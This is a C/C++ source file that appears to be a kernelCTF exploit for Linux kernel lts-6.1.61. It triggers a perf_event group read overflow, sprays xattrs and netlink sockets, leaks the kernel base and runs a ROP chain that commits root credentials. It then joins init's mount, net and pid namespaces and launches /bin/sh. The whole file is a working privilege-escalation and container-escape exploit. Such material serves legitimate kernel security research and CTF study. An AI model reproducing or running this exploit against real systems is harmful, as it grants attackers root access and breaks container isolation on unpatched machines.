#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/resource.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/membarrier.h>

#include <cassert>

#include <xdk/core.h>
#include <xdk/postrip.h>

INCBIN(target_db, "target_db.kxdb");

#define READ_BUF_SIZE 2048
#define XATTR_DATA_LEN1 (READ_BUF_SIZE/2)

#define NUM_SIBLINGS (65536/8 - 1 + READ_BUF_SIZE/8)

#define OBJS_PER_SLAB 16

#define SOCK_SLABS (2*OBJS_PER_SLAB)
#define SOCK_SPRAY (SOCK_SLABS*OBJS_PER_SLAB)

#define XATTR_SPRAY1 1000
#define XATTR_SPRAY2 (SOCK_SLABS+OBJS_PER_SLAB)

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

struct perf_event_attr attr;

int sib_fds[NUM_SIBLINGS];

long read_buf[8192];

int xattr_fd;

/*
 * Syscall wrappers.
 */

int perf_event_open(struct perf_event_attr *attr, pid_t pid, unsigned int cpu, int group_fd, unsigned long flags)
{
    return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

int membarrier(unsigned int flags, int cpu_id) {
    return syscall(SYS_membarrier, flags, cpu_id);
}

void pin_cpu () {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

void set_attr (void) {
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_PAGE_FAULTS;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;
}

int num_xattr = 0;
int spray_simple_xattrs(int num_spray, void *xattr_val, int xattr_len) {
    char name[32];
    int ret = num_xattr;
    for (int i = 0; i < num_spray; i++, num_xattr++) {
        sprintf(name, "security.%d", num_xattr);
        if (fsetxattr(xattr_fd, name, xattr_val, xattr_len, 0) == -1)
            err_exit("[-] fsetxattr");
    }
    return ret;
}

int sock_fds[SOCK_SPRAY];
void spray_socks (void) {
    for (int i = 0; i < SOCK_SPRAY; i++) {
        sock_fds[i] = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock_fds[i] == -1)
            err_exit("[-] socket");
    }
}

void inc_counters (int fd, int inc) {
    if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) == -1)
        err_exit("[-] ioctl");
    for (int i = 0; i < inc; i++) {
        char *m = static_cast<char*>(mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0));
        if (m == MAP_FAILED)
            err_exit("[-] mmap");
        m[0] = 0; /* Page fault */
        if (munmap(m, 4096) == -1)
            err_exit("[-] munmap");
    }
    if (ioctl(fd, PERF_EVENT_IOC_DISABLE, 0) == -1)
        err_exit("[-] ioctl");
}

int main (int argc, char **argv) {
    long kernel_base;
    int xattr_header_size;
    int sk_rcu_off, sk_destruct_off, sk_write_space_off, netlink_bind_off;
    int __sk_destruct, sock_def_write_space, rtnetlink_bind, rtnetlink_bind_ret;
    int tfd1, tfd2, rop_off, num_incs1, num_incs2;

    char name[32];
    int num_events = 0;
    int target_sock;
    int optval = 1;

    TargetDb kxdb("target_db.kxdb", target_db);

    /*
        Target st("kernelctf", "lts-6.1.61");

        st.AddStruct("netlink_sock", 1120,
            {{"sk.sk_destruct", 720, 8},
            {"sk.sk_rcu.next", 744, 8},
            {"sk.sk_rcu.func", 752, 8},
            {"netlink_bind", 1040, 8},
            {"sk.sk_write_space", 688, 8}});

        st.AddSymbol("__sk_destruct", 0xd1b360);
        st.AddSymbol("rtnetlink_bind", 0xd52e80);

        kxdb.AddTarget(st);
    */

    auto target = kxdb.AutoDetectTarget();

    printf("[+] Running on target: %s %s\n", target.GetDistro().c_str(), target.GetReleaseName().c_str());

    xattr_header_size = target.GetStruct("simple_xattr").size;
    printf("[+] xattr_header_size: %d\n", xattr_header_size);

    sk_rcu_off = target.GetStruct("netlink_sock").fields.at("sk.sk_rcu.next").offset;
    printf("[+] netlink_sock.sk.sk_rcu_off: %d\n", sk_rcu_off);

    sk_destruct_off = target.GetStruct("netlink_sock").fields.at("sk.sk_destruct").offset;
    printf("[+] netlink_sock.sk.sk_destruct_off: %d\n", sk_destruct_off);

    sk_write_space_off = target.GetStruct("netlink_sock").fields.at("sk.sk_write_space").offset;
    printf("[+] netlink_sock.sk.sk_write_space: %d\n", sk_write_space_off);

    netlink_bind_off = target.GetStruct("netlink_sock").fields.at("netlink_bind").offset;
    printf("[+] netlink_sock.netlink_bind: %d\n", netlink_bind_off);

    /* Target event fds */
    tfd1 = (READ_BUF_SIZE - 8 + sk_write_space_off)/8;
    tfd2 = (READ_BUF_SIZE - 8 + netlink_bind_off)/8;

    __sk_destruct = target.GetSymbolOffset("__sk_destruct");
    printf("[+] __sk_destruct: 0x%x\n", __sk_destruct);

    sock_def_write_space = target.GetSymbolOffset("sock_def_write_space");
    printf("[+] sock_def_write_space: 0x%x\n", sock_def_write_space);

    num_incs1 = __sk_destruct - sock_def_write_space;

    // (gdb) print rtnetlink_bind
    // $5 = {int (struct net *, int)} 0xffffffff81d52e80 <rtnetlink_bind>
    rtnetlink_bind = target.GetSymbolOffset("rtnetlink_bind");
    printf("[+] rtnetlink_bind: 0x%x\n", rtnetlink_bind);
    // (gdb) disassemble rtnetlink_bind
    // ...
    // 0xffffffff81d52e8f <+15>:	jmp    0xffffffff82404c80 <__x86_return_thunk>
    rtnetlink_bind_ret = target.GetSymbolOffset("rtnetlink_bind") + 0xf;

    num_incs2 = rtnetlink_bind_ret - rtnetlink_bind;

    rop_off = READ_BUF_SIZE - sk_rcu_off - xattr_header_size;

    char xattr_data[rop_off + sk_destruct_off + 8];

    pin_cpu();
    set_attr();

    struct rlimit rlim = { 4096, 4096 };
    if (setrlimit(RLIMIT_NOFILE, &rlim) == -1)
        err_exit("[-] setrlimit");

    pid_t ppid = getpid();

    printf("[*] Opening events\n");

    /* Create group leader event */
    attr.read_format = PERF_FORMAT_GROUP;
    attr.disabled = 0;
    sib_fds[0] = perf_event_open(&attr, ppid, -1, -1, 0);
    if (sib_fds[0] == -1)
        err_exit("[-] perf_event_open");

    /* Create sibling events */
    attr.read_format = 0;
    attr.disabled = 1;
    for (int i = 1; i <= tfd2; i++) {
            sib_fds[i] = perf_event_open(&attr, ppid, -1, sib_fds[0], 0);
            if (sib_fds[i] == -1) {
                err_exit("[-] perf_event_open");
            }
    }

    inc_counters(sib_fds[tfd1], num_incs1);
    inc_counters(sib_fds[tfd2], num_incs2);

    /* Create more events from child processes to get around open fd limit. */
    for (int i = 0; i < 3; i++) {
        pid_t cpid = fork();
        if (cpid == -1)
            err_exit("[-] fork");
        if (cpid)
            continue;
        for (int j = 1; j <= 2048; j++) {
            sib_fds[j] = perf_event_open(&attr, ppid, -1, sib_fds[0], 0);
            if (sib_fds[j] == -1) {
                err_exit("[-] perf_event_open");
            }
        }
        sleep(-1);
    }

    /* Wait for events to be created */
    while (num_events <= 2048*3 + tfd2) {
        if (read(sib_fds[0], read_buf, 65536) == -1)
            err_exit("[-] read");
        num_events = read_buf[0];
    }

    /* Create the rest of the events */
    for (int i = tfd2 + 1; num_events < NUM_SIBLINGS; i++, num_events++) {
            sib_fds[i] = perf_event_open(&attr, ppid, -1, sib_fds[0], 0);
            if (sib_fds[i] == -1) {
                err_exit("[-] perf_event_open");
            }
    }

    printf("[*] Event group ready\n");

    xattr_fd = open("/tmp/", O_TMPFILE | O_RDWR, 0666);
    if (xattr_fd == -1)
        err_exit("[-] open");

    /* Fill up preexisting partial slabs */
    spray_simple_xattrs(XATTR_SPRAY1, xattr_data, XATTR_DATA_LEN1);


    /* Create target slabs */
    spray_socks();
    for (int i = 0; i < SOCK_SPRAY; i++) {
        if (i % OBJS_PER_SLAB == 0) {
            close(sock_fds[i]);
            sock_fds[i] = -1;
        }

    }

    /* Wait for netlink_socks to be freed */
    if (membarrier(MEMBARRIER_CMD_GLOBAL, 0) == -1)
        err_exit("[-] membarrier");

    /* Fill active slab */
    spray_simple_xattrs(OBJS_PER_SLAB, xattr_data, XATTR_DATA_LEN1);

    /* Trigger vulnerability */
    if (read(sib_fds[0], read_buf, READ_BUF_SIZE) == -1)
        err_exit("[-] read");

    /* Leak kernel base */
    target_sock = -1;
    optval = 1;
    for (int i = 0; i < SOCK_SPRAY; i++) {
        if (sock_fds[i] == -1)
            continue;
        int ret = setsockopt(sock_fds[i], SOL_NETLINK, NETLINK_ADD_MEMBERSHIP, &optval, sizeof(optval));
        if (ret) {
            kernel_base = 0xffffffff00000000 | (ret & 0xff000000);
            target_sock = sock_fds[i];
            break;
        }
    }

    if (target_sock == -1) {
        printf("[-] OOB failed\n");
        exit(1);
    }
    printf("[*] Leaked kernel base: %p\n", kernel_base);

    printf("[+] ROP chain:\n");
    RopChain rop(target, kernel_base);
    rop.AddRopAction(RopActionId::COMMIT_INIT_TASK_CREDS);
    rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {1});
    rop.AddRopAction(RopActionId::TELEFORK, {100000});
    HexDump::Print(rop.GetData());
    printf("[+] ROP chain size: %d\n", rop.GetData().size());

    Payload payload1(rop_off);
    Payload payload2(sk_destruct_off + 8);
    PayloadBuilder builder(target.GetPivots(), kernel_base); // create builder

    builder.AddPayload(payload1, std::nullopt, std::nullopt);
    builder.AddPayload(payload2, Register::RBP, sk_destruct_off); // add payload, with register, and rip_offset
    builder.AddRopChain(rop); // add a rop chain
    if(!builder.Build()) exit(-1); // build it
    
    builder.PrintDebugInfo();

    printf("[+] Stack pivot and ROP part of payload:\n");
    HexDump::Print(payload2.GetData());
    printf("Stack pivot and ROP part of payload: %d\n", payload2.GetData().size());

    std::vector<uint8_t> full_payload;
    full_payload.insert(full_payload.end(), payload1.GetData().begin(), payload1.GetData().end());
    full_payload.insert(full_payload.end(), payload2.GetData().begin(), payload2.GetData().end());

    printf("[+] Full payload:\n");
    HexDump::Print(full_payload);
    printf("Full payload size: %d\n", full_payload.size());

    /* Trigger ROP */
    spray_simple_xattrs(XATTR_SPRAY2, full_payload.data(), full_payload.size());

    if (setsockopt(target_sock, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval)) == -1)
        err_exit("[-] setsockopt");

    printf("[+] Returned from ROP\n");

    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);

    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");
    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");

    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");

    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    printf("[*] Launching shell\n");
    system("/bin/sh");
    return 0;
}
